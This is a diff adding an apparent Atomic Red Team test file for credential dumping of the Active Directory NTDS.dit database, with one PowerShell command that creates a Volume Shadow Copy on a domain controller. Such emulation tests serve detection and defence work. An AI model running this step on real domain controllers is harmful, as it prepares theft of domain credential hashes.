@@ -1,0 +1,8 @@
+#TechniqueName: OS Credential Dumping: NTDS
+#AtomicTestName: Create Volume Shadow Copy with Powershell
+#Description: This test is intended to be run on a domain Controller.&&The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.&
+#Language: ps1
+
+#commands
+(gwmi -list win32_shadowcopy).Create(C:,'ClientAccessible')
+
